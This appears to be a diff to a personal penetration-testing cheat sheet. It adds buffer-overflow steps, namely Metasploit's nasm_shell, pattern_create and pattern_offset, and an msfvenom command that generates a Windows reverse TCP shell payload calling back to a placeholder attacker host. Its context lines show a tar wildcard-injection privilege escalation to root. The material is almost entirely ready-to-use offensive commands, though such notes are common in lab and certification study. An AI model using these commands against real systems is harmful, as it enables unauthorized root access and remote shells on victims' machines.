@@ -17,6 +17,17 @@ $touch ./--checkpoint-action\=exec\=sh\ root.sh
 $touch ./--checkpoint=1
 $sudo -u root /bin/bash
 
+-finding opcode "jmp esp"-
+/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+
+-pattern create-
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
+
 -offset finder-
-/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q <char>
+
+-buffer overflow payload-
+msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> EXITFUNC=thread -f c -a x86 –platform windows -b "\x00"
+
+
+
